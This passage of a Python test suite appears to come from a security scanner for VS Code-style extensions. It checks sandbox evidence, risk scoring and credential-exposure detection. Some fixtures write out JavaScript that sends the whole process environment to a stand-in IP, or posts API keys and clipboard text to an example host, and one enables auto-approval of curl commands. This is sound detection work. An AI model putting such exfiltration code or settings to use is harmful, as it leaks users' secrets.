        extension.extension_id = "publisher.extension"
        extension.instance_id = "publisher.extension@1.0.0"
        extension.analysis_coverage = {"providers": {}}
        _apply_sandbox_provider(
            [extension],
            {
                "metadata": {
                    "status": "executed",
                    "mode": "executed",
                    "execution": "controlled-bubblewrap",
                    "executed": True,
                    "external_syscall_trace": True,
                    "external_syscall_trace_available": True,
                    "runtime_policy": "capability-gated-v1",
                    "runtime_required_instances": ["publisher.extension@1.0.0"],
                    "runtime_runs": [{
                        "instance_id": "publisher.extension@1.0.0",
                        "extension_id": "publisher.extension",
                        "status": "failed",
                        "external_syscall_trace": True,
                    }],
                },
                "extensions": {"publisher.extension@1.0.0": []},
            },
        )
        provider = extension.analysis_coverage["providers"]["dynamic_sandbox"]
        self.assertEqual(provider["status"], "failed")
        self.assertEqual(provider["runtime_run_status"], "failed")

    def test_runtime_evidence_does_not_collide_for_duplicate_installations(self) -> None:
        first = MagicMock()
        first.instance_id = "vscode-installation"
        first.extension_id = "publisher.extension"
        first.version = "1.0.0"
        first.artifact_hash = "a" * 64
        first.capabilities = [{"id": "process_execution"}]
        first.analysis_coverage = {"resolved_entrypoints": ["extension.js"]}

        second = MagicMock()
        second.instance_id = "cursor-installation"
        second.extension_id = "publisher.extension"
        second.version = "1.0.0"
        second.artifact_hash = "b" * 64
        second.capabilities = [{"id": "process_execution"}]
        second.analysis_coverage = {"resolved_entrypoints": ["extension.js"]}

        runtime_bundle: dict[str, object] = {
            "extensions": {},
            "runs": [],
            "required_extension_ids": [],
        }
        runtime = {"mode": "executed", "extensions": {"publisher.extension": [{"kind": "process_exec"}]}}
        with patch("ide_scanner.scanner.run_sandbox", return_value=runtime):
            _apply_local_dynamic_runtime(
                [{"path": "/tmp/vscode-extension"}, {"path": "/tmp/cursor-extension"}],
                [first, second],
                runtime_bundle,
                7,
            )

        self.assertEqual(
            set(runtime_bundle["extensions"]),
            {"publisher.extension", "cursor-installation"},
        )
        self.assertEqual(
            runtime_bundle["runtime_required_instances"],
            ["vscode-installation", "cursor-installation"],
        )
        self.assertEqual([len(runtime_bundle["extensions"][key]) for key in ("publisher.extension", "cursor-installation")], [1, 1])

        _apply_sandbox_provider(
            [first, second],
            {
                "metadata": {
                    "status": "executed",
                    "execution": "controlled-bubblewrap",
                    "executed": True,
                    "runtime_policy": "capability-gated-v1",
                    "external_syscall_trace": True,
                    "runtime_required_ids": ["publisher.extension"],
                    "runtime_required_instances": runtime_bundle["runtime_required_instances"],
                },
                "extensions": runtime_bundle["extensions"],
            },
        )
        self.assertEqual(
            [item.analysis_coverage["providers"]["dynamic_sandbox"]["observation_count"] for item in (first, second)],
            [1, 1],
        )

    def test_failed_runtime_entrypoint_is_not_reported_as_completed(self) -> None:
        failed = subprocess.CompletedProcess(
            args=["node"], returncode=1, stdout="", stderr="activation failed",
        )
        with patch("ide_scanner.sandbox_runner._run_isolated", return_value=failed):
            observations = _execute_entrypoint(
                Path("/tmp/runner"),
                Path("/tmp/home"),
                Path("/tmp/workspace"),
                5,
                Path("/tmp/hook"),
                Path("/tmp/trace"),
                Path("/tmp/target"),
            )
        self.assertEqual(observations[0]["kind"], "sandbox_error")
        self.assertEqual(observations[0]["phase"], "activation")
        self.assertEqual(
            observations[0]["stderr_sha256"],
            hashlib.sha256(b"activation failed").hexdigest(),
        )
        self.assertEqual(observations[0]["stderr_bytes"], len(b"activation failed"))
        self.assertNotIn("stderr_excerpt", observations[0])

    def test_nonzero_entrypoint_with_authenticated_runtime_evidence_remains_covered(self) -> None:
        failed = subprocess.CompletedProcess(
            args=["node"], returncode=1, stdout="", stderr="activation reached a blocked optional integration",
        )
        with patch("ide_scanner.sandbox_runner._run_isolated", return_value=failed), patch(
            "ide_scanner.sandbox_runner._verified_runtime_events", return_value=([{"kind": "network_attempt"}], True),
        ), patch(
            "ide_scanner.sandbox_runner._external_trace_observations", return_value=([{"kind": "process_exec"}], True),
        ):
            observations = _execute_entrypoint(
                Path("/tmp/runner"),
                Path("/tmp/home"),
                Path("/tmp/workspace"),
                5,
                Path("/tmp/hook"),
                Path("/tmp/trace"),
                Path("/tmp/target"),
            )
        self.assertEqual(observations[0]["kind"], "runtime_entrypoint_error")
        self.assertEqual(observations[0]["returncode"], 1)

    def test_runtime_without_node_entrypoint_does_not_create_a_false_failure(self) -> None:
        observations = _execute_entrypoint(
            Path("/tmp/runner"),
            Path("/tmp/home"),
            Path("/tmp/workspace"),
            5,
            Path("/tmp/hook"),
            Path("/tmp/trace"),
            Path("/tmp/target"),
            entrypoint=None,
        )
        self.assertEqual(observations, [{
            "kind": "entrypoint_not_applicable",
            "phase": "activation",
            "evidence": "manifest declares no Node activation entrypoint",
        }])

    def test_browser_entrypoint_is_used_when_desktop_main_is_absent(self) -> None:
        self.assertEqual(_extension_main({"browser": "./dist/browser.js"}), "./dist/browser.js")
        self.assertEqual(
            _extension_main({"main": "./dist/desktop.js", "browser": "./dist/browser.js"}),
            "./dist/desktop.js",
        )

    def test_range_derived_advisory_is_context_until_version_is_resolved(self) -> None:
        finding = Finding(
            finding_id="range-advisory",
            extension_id="usernamehw.errorlens",
            version="3.28.0",
            rule_id="vulnerable-npm-dependency",
            category="dependency",
            severity="MEDIUM",
            confidence=0.7,
            score=50,
            evidence_type="registry",
            evidence_summary="A declared dependency range can include an affected version.",
            evidence={"evidence_class": "dependency", "exact": False, "package": "lodash", "version": "4.17.21"},
        )

        verdict, _reason, _authority, severity, malware, risk, _details = _classify_findings([finding])

        self.assertEqual(verdict, "clean")
        self.assertEqual(severity, "INFO")
        self.assertEqual(malware, 0)
        self.assertEqual(risk, 0)

    def test_marketplace_acquisition_failure_survives_coverage_finalization(self) -> None:
        failed = _marketplace_error_extension("publisher.large", "VSIX download exceeded the byte cap; aborted.")
        with patch("ide_scanner.scanner.scan_marketplace_extension", return_value=failed):
            report = scan_targets(marketplace_scan_ids=["publisher.large"])

        skipped = report["extensions"][0]["artifact_inventory"]["skipped_reason"]
        self.assertIn("VSIX download exceeded the byte cap", skipped)
        self.assertEqual(report["extensions"][0]["decision"], "incomplete")
        self.assertEqual(report["extensions"][0]["analysis_status"], "failed")

    def test_capability_reclassification_does_not_inflate_correlated_score(self) -> None:
        finding = Finding(
            finding_id="workspace-process",
            extension_id="dbaeumer.vscode-eslint",
            version="3.0.33",
            rule_id="untrusted-workspace-input-to-process",
            category="execution",
            severity="MEDIUM",
            confidence=0.8,
            score=50,
            evidence_type="static",
            evidence_summary="Workspace configuration reaches process execution.",
            evidence={"evidence_class": "capability"},
        )

        details = _score_details([finding])

        self.assertEqual(details["components"]["correlated_behavior"], 0)
        self.assertEqual(details["components"]["sensitive_capability"], 38)
        self.assertEqual(details["malware_score"], 0)
        self.assertEqual(details["risk_score"], 38)

    def test_posture_detects_risky_client_setup(self) -> None:
        with TemporaryDirectory() as tmp:
            home = Path(tmp)
            user = home / ".config" / "Code" / "User"
            user.mkdir(parents=True)
            (user / "settings.json").write_text(
                """
                {
                  "security.workspace.trust.enabled": false,
                  "task.allowAutomaticTasks": "on",
                  "chat.tools.global.autoApprove": true,
                  "chat.tools.terminal.ignoreDefaultAutoApproveRules": true,
                  "chat.tools.terminal.autoApprove": {"curl *": true},
                  "chat.tools.urls.autoApprove": {"*": true},
                  "extensions.supportUntrustedWorkspaces": {
                    "unknown.helper": {"supported": true}
                  }
                }
                """,
                encoding="utf-8",
            )
            extensions_root = home / ".vscode" / "extensions"
            extension = extensions_root / "unknown.helper-1.0.0"
            extension.mkdir(parents=True)
            (extension / "package.json").write_text(
                """
                {
                  "publisher": "unknown",
                  "name": "helper",
                  "version": "1.0.0",
                  "activationEvents": ["onStartupFinished"],
                  "contributes": {"languageModelTools": [{"name": "run"}]}
                }
                """,
                encoding="utf-8",
            )
            (extensions_root / "extensions.json").write_text(
                """
                [{
                  "identifier": {"id": "unknown.helper"},
                  "version": "1.0.0",
                  "relativeLocation": "unknown.helper-1.0.0",
                  "metadata": {"source": "vsix"}
                }]
                """,
                encoding="utf-8",
            )

            metrics = scan_posture(home)
            summary = summarize_posture(metrics)

        by_id = {metric.id: metric for metric in metrics}
        self.assertEqual(summary["status"], "failure")
        self.assertGreaterEqual(summary["score"], 70)
        self.assertEqual(by_id["workspace-trust"].status, "failure")
        self.assertEqual(by_id["agent-global-auto-approve"].status, "failure")
        self.assertEqual(by_id["terminal-auto-approve"].status, "failure")
        self.assertEqual(by_id["url-auto-approve"].status, "failure")
        self.assertEqual(by_id["extension-trust-overrides"].status, "failure")
        self.assertEqual(by_id["sideloaded-extensions"].status, "failure")
        self.assertEqual(by_id["extension-startup"].status, "warning")
        self.assertEqual(by_id["agentic-extensions"].status, "warning")

    def test_fixture_scan_classifies_extensions(self) -> None:
        report = scan_targets(include_fixtures=True)
        self.assertEqual(report["summary"]["total_extensions"], len(discover_from_path(Path("fixtures"))))
        self.assertIn("posture_summary", report)
        self.assertIn("posture_score", report["summary"])
        by_id = {extension["extension_id"]: extension for extension in report["extensions"]}

        self.assertEqual(by_id["trusted.trusted-formatter"]["verdict"], "clean")
        self.assertEqual(by_id["trusted.startup-theme"]["verdict"], "clean")
        self.assertEqual(by_id["knownbad.feed-hit"]["verdict"], "clean")
        self.assertEqual(by_id["unknown.dropper"]["verdict"], "suspicious")
        self.assertEqual(by_id["example.mutable-dependency"]["verdict"], "clean")
        self.assertEqual(by_id["example.mutable-dependency"]["severity"], "LOW")
        self.assertEqual(by_id["example.native-artifact"]["verdict"], "clean")

        suspicious = by_id["unknown.shadow-helper"]
        self.assertEqual(suspicious["verdict"], "suspicious")
        self.assertEqual(suspicious["severity"], "HIGH")
        self.assertEqual(suspicious["malware_score"], 0)
        self.assertGreater(suspicious["risk_score"], 0)
        self.assertIn("credential-exfiltration-chain", {finding["rule_id"] for finding in suspicious["findings"]})

        agent = by_id["example.agent-toolbox"]
        self.assertEqual(agent["verdict"], "clean")
        self.assertEqual(agent["malware_score"], 0)
        self.assertEqual(agent["risk_score"], 0)
        self.assertIn("agentic-tooling", {finding["rule_id"] for finding in agent["findings"]})

    def test_posture_can_be_disabled_for_hosted_package_scans(self) -> None:
        report = scan_targets(include_fixtures=True, include_posture=False)

        self.assertEqual(report["posture"], [])
        self.assertEqual(report["posture_summary"]["status"], "skipped")
        self.assertEqual(report["summary"]["posture_status"], "skipped")
        self.assertFalse(any("IDE/client posture" in item for item in report["human_summary"]))

    def test_report_bundle_splits_summary_leaderboard_and_details(self) -> None:
        report = scan_targets(include_fixtures=True)
        bundle = build_report_bundle(report, profile="smart", source="fixtures")

        self.assertEqual(bundle["metadata"]["schema_version"], "2.3")
        self.assertEqual(bundle["metadata"]["profile"], "smart")
        self.assertEqual(bundle["metadata"]["source"], "fixtures")
        self.assertEqual(bundle["metadata"]["policy_version"], "3.1.0-calibration.7")
        self.assertEqual(bundle["metadata"]["scanner_build"], report["scanner_build"])
        self.assertEqual(bundle["metadata"]["ruleset_version"], report["ruleset_version"])
        self.assertEqual(bundle["summary"]["summary"]["total_extensions"], len(discover_from_path(Path("fixtures"))))
        self.assertEqual(bundle["summary"]["summary"]["suspicious"], 3)
        self.assertIn("rules", bundle["rules"])

        rows = bundle["leaderboard"]["extensions"]
        self.assertEqual(len(rows), len(discover_from_path(Path("fixtures"))))
        self.assertTrue(all("detail_ref" in row for row in rows))
        suspicious = next(row for row in rows if row["extension_id"] == "unknown.shadow-helper")
        self.assertEqual(suspicious["grade"], "D")
        self.assertEqual(suspicious["decision"], "block")
        self.assertEqual(suspicious["coverage_percent"], 100)
        self.assertEqual(len(suspicious["artifact_sha256"]), 64)
        self.assertIn("credential-exfiltration-chain", suspicious["top_findings"])

        safe = next(row for row in rows if row["extension_id"] == "trusted.trusted-formatter")
        self.assertEqual(safe["top_findings"], [])

        detail = bundle["extensions"][suspicious["detail_ref"]]
        raw = next(item for item in report["extensions"] if item["extension_id"] == "unknown.shadow-helper")
        for field in ("analysis_status", "decision", "severity", "risk_score", "malware_score"):
            self.assertEqual(detail[field], raw[field], msg=f"canonical field diverged: {field}")
        self.assertEqual(detail["artifact_identity"]["sha256"], raw["artifact_identity"]["sha256"])
        raw_findings = {item["finding_id"]: item for item in raw["findings"]}
        detail_findings = {item["finding_id"]: item for item in detail["findings"]}
        for finding_id in raw_findings.keys() & detail_findings.keys():
            for field in ("evidence_class", "actionability", "effective_severity"):
                self.assertEqual(detail_findings[finding_id][field], raw_findings[finding_id][field])
        self.assertEqual(detail["extension_id"], "unknown.shadow-helper")
        self.assertIn("score_explanation", detail)
        self.assertIn("recommendations", detail)
        self.assertTrue(detail["evidence"])
        self.assertTrue(detail["artifact_inventory"]["files"])
        self.assertIn("dependency_inventory", detail)
        self.assertEqual(
            set(detail["security_dimensions"]),
            {
                "behavior_safety",
                "supply_chain_integrity",
                "dependency_health",
                "artifact_integrity",
                "publisher_project_health",
                "analysis_confidence",
            },
        )
        self.assertIn("basis", detail["security_dimensions"]["behavior_safety"])
        self.assertIn("evidence_refs", detail["findings"][0])
        self.assertNotIn("evidence", detail["findings"][0])

    def test_legacy_report_keeps_legacy_policy_and_infers_completed_status(self) -> None:
        report = {
            "scan_id": "legacy-scan",
            "extensions": [{
                "extension_id": "example.legacy",
                "name": "legacy",
                "publisher": "example",
                "version": "1.0.0",
                "decision": "allow",
                "analysis_coverage": {"status": "complete", "coverage_percent": 100},
                "findings": [],
            }],
        }

        bundle = build_report_bundle(report)
        detail = next(iter(bundle["extensions"].values()))

        self.assertEqual(bundle["metadata"]["policy_version"], "legacy")
        self.assertEqual(bundle["metadata"]["ruleset_version"], "legacy")
        self.assertEqual(bundle["metadata"]["completed_extensions"], 1)
        self.assertEqual(bundle["metadata"]["incomplete_extensions"], 0)
        self.assertEqual(detail["analysis_status"], "complete")

    def test_contextual_findings_get_context_score_and_clean_with_notes_label(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"notes","version":"1.0.0"}',
                encoding="utf-8",
            )

            report = scan_targets(paths=[root])
            bundle = build_report_bundle(report, profile="smart", source="folder")

        row = bundle["leaderboard"]["extensions"][0]
        detail = bundle["extensions"][row["detail_ref"]]
        self.assertEqual(row["verdict"], "clean")
        self.assertEqual(row["risk_score"], 0)
        self.assertGreater(row["context_score"], 0)
        self.assertEqual(row["verdict_state"], "safe_with_notes")
        self.assertEqual(row["verdict_label"], "Safe with notes")
        self.assertEqual(row["actionable_finding_count"], 0)
        self.assertEqual(row["low_finding_count"], 0)
        self.assertEqual(row["contextual_finding_count"], len(detail["findings"]))
        self.assertTrue(all(finding["actionability"] == "contextual" for finding in detail["findings"]))

    def test_configured_cli_execution_is_contextual_not_review(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"cli","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const vscode = require('vscode');\n"
                "const { execFile } = require('child_process');\n"
                "function run(){\n"
                " const cliPath = vscode.workspace.getConfiguration('tool').get('executablePath', 'tool');\n"
                " execFile(cliPath, ['analyze', vscode.window.activeTextEditor.document.uri.fsPath]);\n"
                "}\n",
                encoding="utf-8",
            )

            report = scan_targets(paths=[root])
            bundle = build_report_bundle(report, profile="smart", source="folder")

        scanned = report["extensions"][0]
        rule_ids = {finding["rule_id"] for finding in scanned["findings"]}
        self.assertEqual(scanned["verdict"], "clean")
        self.assertEqual(scanned["risk_score"], 0)
        self.assertIn("process-execution", rule_ids)
        self.assertIn("safe-configured-cli-execution", rule_ids)
        row = bundle["leaderboard"]["extensions"][0]
        self.assertEqual(row["verdict_state"], "safe_with_notes")
        self.assertEqual(row["verdict_label"], "Safe with notes")
        self.assertGreater(row["context_score"], 0)

    def test_workspace_configured_cli_requires_untrusted_workspace_restriction(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            source = (
                "const vscode = require('vscode');\n"
                "const { execFile } = require('child_process');\n"
                "const cliPath = vscode.workspace.getConfiguration('tool').get('executablePath', 'tool');\n"
                "execFile(cliPath, ['analyze', filePath], { shell: false });\n"
            )

            unsafe = root / "unsafe"
            unsafe.mkdir()
            (unsafe / "package.json").write_text(json.dumps({
                "publisher": "example", "name": "unsafe-cli", "version": "1.0.0", "main": "extension.js",
                "contributes": {"configuration": {"properties": {
                    "tool.executablePath": {"type": "string", "default": "tool"}
                }}},
            }), encoding="utf-8")
            (unsafe / "extension.js").write_text(source, encoding="utf-8")

            safe = root / "safe"
            safe.mkdir()
            (safe / "package.json").write_text(json.dumps({
                "publisher": "example", "name": "safe-cli", "version": "1.0.0", "main": "extension.js",
                "capabilities": {"untrustedWorkspaces": {
                    "supported": True,
                    "restrictedConfigurations": ["tool.executablePath"],
                }},
                "contributes": {"configuration": {"properties": {
                    "tool.executablePath": {"type": "string", "default": "tool"}
                }}},
            }), encoding="utf-8")
            (safe / "extension.js").write_text(source, encoding="utf-8")

            unsafe_report = scan_extension(unsafe)
            safe_report = scan_extension(safe)

        self.assertEqual(unsafe_report.verdict, "review")
        self.assertIn("unrestricted-workspace-cli-path", {f.rule_id for f in unsafe_report.findings})
        self.assertEqual(safe_report.verdict, "clean")
        self.assertNotIn("unrestricted-workspace-cli-path", {f.rule_id for f in safe_report.findings})

    def test_regex_exec_and_workspace_tokens_do_not_create_execution_review(self) -> None:
        """RegExp.exec and ordinary editor metadata are not shell execution or a flow."""
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"regex","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const match = /token/.exec(vscode.window.activeTextEditor.document.fileName);\n"
                "const selected = vscode.window.activeTextEditor.selection;\n",
                encoding="utf-8",
            )

            report = scan_targets(paths=[root])

        scanned = report["extensions"][0]
        rule_ids = {finding["rule_id"] for finding in scanned["findings"]}
        self.assertEqual(scanned["verdict"], "clean")
        self.assertNotIn("process-execution", rule_ids)
        self.assertNotIn("dynamic-shell-execution", rule_ids)
        self.assertNotIn("untrusted-input-execution", rule_ids)

    def test_explicit_child_process_exec_is_contextual_capability(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"shell","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "require('child_process').exec('tool --version');\n",
                encoding="utf-8",
            )

            report = scan_targets(paths=[root])

        scanned = report["extensions"][0]
        rule_ids = {finding["rule_id"] for finding in scanned["findings"]}
        self.assertEqual(scanned["verdict"], "clean")
        self.assertEqual(scanned["severity"], "INFO")
        self.assertIn("process-execution", rule_ids)
        self.assertIn("dynamic-shell-execution", rule_ids)

    def test_whole_environment_sent_to_network_is_reviewed(self) -> None:
        """Published environment-exfiltration behavior must not look clean."""
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"env-exporter","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const https = require('https');\n"
                "const snapshot = JSON.stringify({ env: process.env, host: require('os').hostname() });\n"
                "const request = https.request('http://198.51.100.7:1224/api/checkStatus?sysInfo=' + encodeURIComponent(snapshot));\n"
                "request.end();\n",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("environment-data-exfiltration", rule_ids)
        self.assertEqual(report.verdict, "suspicious")
        self.assertEqual(report.decision, "review")
        self.assertEqual(report.malware_score, 0)

    def test_selected_environment_telemetry_stays_clean(self) -> None:
        """Selected, documented telemetry is not equivalent to full env export."""
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"telemetry","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const https = require('https');\n"
                "const telemetry = JSON.stringify({ version: '1.0', platform: process.platform, arch: process.arch });\n"
                "https.request('https://telemetry.example/events', { method: 'POST', body: telemetry }).end();\n",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertNotIn("environment-data-exfiltration", rule_ids)
        self.assertEqual(report.verdict, "clean")
        self.assertEqual(report.decision, "allow")

    def test_environment_read_without_network_is_not_exfiltration(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"env-local","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const environment = JSON.stringify(process.env);\n"
                "module.exports = { environmentLength: environment.length };\n",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertNotIn("environment-data-exfiltration", rule_ids)
        self.assertEqual(report.verdict, "clean")

    def test_environment_passed_to_child_process_is_not_network_exfiltration(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"env-child-process","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const cp = require('child_process');\n"
                "const childEnvironment = process.env;\n"
                "cp.spawn('npm', ['config', 'get', 'prefix'], { env: childEnvironment });\n"
                "fetch('https://registry.example/metadata');\n",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertNotIn("environment-data-exfiltration", rule_ids)
        self.assertEqual(report.verdict, "clean")

    def test_cross_extension_credential_exposure_findings(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                json.dumps({
                    "publisher": "example",
                    "name": "credential-surfaces",
                    "version": "1.0.0",
                    "main": "extension.js",
                    "contributes": {
                        "configuration": {
                            "properties": {
                                "example.openaiApiKey": {
                                    "type": "string",
                                    "description": "OpenAI API key for requests",
                                }
                            }
                        },
                        "commands": [{
                            "command": "example.setApiToken",
                            "title": "Set API token",
                        }],
                    },
                }),
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const vscode = require('vscode');\n"
                "async function activate(context) {\n"
                " const key = await vscode.window.showInputBox({ prompt: 'Enter OpenAI API key' });\n"
                " await context.globalState.update('openaiApiKey', key);\n"
                " const clip = await vscode.env.clipboard.readText();\n"
                " await fetch('https://api.example.com/token', { method: 'POST', body: key || clip });\n"
                " vscode.commands.registerCommand('example.rotateApiToken', () => key);\n"
                "}\n",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("credential-config-key", rule_ids)
        self.assertIn("credential-command-registration", rule_ids)
        self.assertIn("credential-inputbox-prompt", rule_ids)
        self.assertIn("credential-global-state-storage", rule_ids)
        self.assertIn("credential-input-near-state", rule_ids)
        self.assertIn("clipboard-near-credential-surface", rule_ids)
        self.assertIn("credential-source-near-network", rule_ids)
        self.assertEqual(report.verdict, "review")
        self.assertEqual(report.score_details["basis"], "cross_extension_exposure")
        self.assertGreaterEqual(report.risk_score, 50)

    def test_far_apart_credential_surfaces_do_not_create_control_chain(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"far-surfaces","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            padding = "// unrelated implementation detail\n" * 200
            (root / "extension.js").write_text(
                "vscode.window.showInputBox({ prompt: 'Enter API token' });\n"
                + padding
                + "context.globalState.update('apiToken', 'documented default');\n",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertNotIn("credential-input-near-state", rule_ids)

    def test_protect_your_secrets_csv_adapter_normalizes_labels(self) -> None:
        with TemporaryDirectory() as tmp:
            source = Path(tmp) / "Ground_Truth_datasets.csv"
            source.write_text(
                "\ufeffextensionID,install,type,is_vulnerable,data\n"
                "pub.secret,123,RequestedConfiguration,Credential,openai.apiKey\n"
                "pub.secret,123,InputBox,Credential,Enter API token\n"
                "pub.pii,5,GlobalState,PII,email\n"
                "pub.clean,9,Commands,Other,format document\n",
                encoding="utf-8",
            )

            dataset = normalize_ground_truth_csv(source)

        by_id = {item["extension_id"]: item for item in dataset["extensions"]}
        self.assertEqual(dataset["credential_data_points"], 2)
        self.assertEqual(dataset["credential_extension_count"], 1)
        self.assertEqual(by_id["pub.secret"]["label"], "credential_exposure")
        self.assertEqual(by_id["pub.secret"]["expected_findings"], ["credential-config-key", "credential-inputbox-prompt"])
        self.assertEqual(by_id["pub.pii"]["label"], "pii_exposure")
        self.assertEqual(by_id["pub.clean"]["label"], "non_credential")

    def test_credential_exposure_benchmark_runs_against_report_bundle(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp) / "extension"
            root.mkdir()
            (root / "package.json").write_text(
                json.dumps({
                    "publisher": "pub",
                    "name": "secret",
                    "version": "1.0.0",
                    "main": "extension.js",
                }),
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const vscode = require('vscode');\n"
                "async function activate(context) {\n"
                " const token = await vscode.window.showInputBox({ prompt: 'Enter GitHub token' });\n"
                " await context.globalState.update('githubToken', token);\n"
                "}\n",
                encoding="utf-8",
            )
            dataset_path = Path(tmp) / "dataset.json"
            dataset_path.write_text(json.dumps({
                "dataset_id": "test-credential-exposure",
                "source": "unit-test",
                "extensions": [{
                    "extension_id": "pub.secret",
                    "version": "1.0.0",
                    "label": "credential_exposure",
                    "exposure_types": ["inputBox", "globalState"],
                    "expected_findings": ["credential-inputbox-prompt", "credential-global-state-storage"],
                    "reference": "unit-test",
                }],
            }), encoding="utf-8")
            report = scan_targets(paths=[root])
            report_zip = Path(tmp) / "report.zip"
            write_report_bundle(report, report_zip, profile="benchmark", source="folder")

            result = run_credential_exposure_benchmark(dataset_path, report_zip)
            benchmark_zip = Path(tmp) / "benchmark.zip"
            receipt = write_benchmark_bundle(result, benchmark_zip)

            with zipfile.ZipFile(benchmark_zip) as archive:
                names = set(archive.namelist())

        row = result["leaderboard"]["extensions"][0]
        self.assertEqual(row["outcome"], "true_positive")
        self.assertEqual(result["benchmark_summary"]["recall"], 1.0)
        self.assertEqual(result["benchmark_summary"]["precision"], 1.0)
        self.assertIn("credential-inputbox-prompt", row["matched_findings"])
        self.assertEqual(receipt["output"], str(benchmark_zip))
        self.assertIn("benchmark_summary.json", names)
        self.assertIn("rule_coverage.json", names)
        self.assertIn("extensions/pub.secret.json", names)

    def test_compiled_out_directory_is_scanned(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "out").mkdir()
            (root / "package.json").write_text(
                '{"publisher":"example","name":"compiled","version":"1.0.0","main":"./out/extension.js"}',
                encoding="utf-8",
            )
            (root / "out" / "extension.js").write_text(
                "const { execFile } = require('child_process'); execFile('tool', ['--version']);",
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertIn("process-execution", {finding.rule_id for finding in report.findings})

    def test_write_report_bundle_creates_dashboard_ready_zip(self) -> None:
        with TemporaryDirectory() as tmp:
            report = scan_targets(paths=[Path("fixtures") / "credential-exfil"])
            output = Path(tmp) / "report.zip"
            receipt = write_report_bundle(report, output, profile="standard", source="folder")

            self.assertEqual(receipt["output"], str(output))
            with zipfile.ZipFile(output) as archive:
                names = set(archive.namelist())
                self.assertIn("metadata.json", names)
                self.assertIn("summary.json", names)
                self.assertIn("leaderboard.json", names)
                self.assertIn("posture.json", names)
                self.assertIn("rules.json", names)
                detail_names = [name for name in names if name.startswith("extensions/")]
                self.assertEqual(len(detail_names), 1)
                metadata = json.loads(archive.read("metadata.json"))
                leaderboard = json.loads(archive.read("leaderboard.json"))

        self.assertEqual(metadata["profile"], "standard")
        self.assertEqual(metadata["source"], "folder")
        self.assertEqual(leaderboard["extensions"][0]["detail_ref"], detail_names[0])

    def test_report_stream_events_include_summary_and_detail_refs(self) -> None:
        report = scan_targets(paths=[Path("fixtures") / "credential-exfil"])
        events = list(iter_report_events(report, profile="smart", source="folder", output="report.zip"))

        self.assertEqual(events[0]["type"], "scan_started")
        self.assertEqual(events[0]["total_extensions"], 1)
        self.assertIn("extension_summary_ready", {event["type"] for event in events})
        self.assertIn("extension_detail_ready", {event["type"] for event in events})
        self.assertEqual(events[-1]["type"], "scan_completed")
        self.assertEqual(events[-1]["output"], "report.zip")
        summary = next(event for event in events if event["type"] == "extension_summary_ready")
        self.assertEqual(summary["extension_id"], "unknown.shadow-helper")
        self.assertEqual(summary["verdict"], "suspicious")
        self.assertTrue(summary["detail_ref"].startswith("extensions/"))

    def test_path_discovery_finds_fixture_extensions(self) -> None:
        targets = discover_from_path(Path("fixtures"))
        paths = {Path(item["path"]).name for item in targets}
        self.assertTrue({
            "agent-tool", "benign-formatter", "credential-exfil", "lifecycle-dropper",
            "mutable-dependency", "native-artifact", "startup-theme", "threat-feed-malware",
        }.issubset(paths))

    def test_benchmark_uses_known_malicious_feed_fixture(self) -> None:
        result = _run_benchmark()
        by_id = {row["extension_id"]: row for row in result["rows"]}
        self.assertEqual(result["total"], 8)
        self.assertEqual(by_id["knownbad.feed-hit"]["expected_verdict"], "malicious")
        self.assertEqual(by_id["knownbad.feed-hit"]["actual_verdict"], "malicious")
        self.assertEqual(result["false_negative"], 0)
        self.assertTrue(result["rule_observations"])
        self.assertEqual(result["rule_observations"][0]["rule_id"], "repo-url-missing")

    def test_discovery_finds_vsix_files(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            vsix = root / "example.vsix"
            with zipfile.ZipFile(vsix, "w") as archive:
                archive.writestr("extension/package.json", '{"publisher":"example","name":"vsix","version":"1.0.0"}')

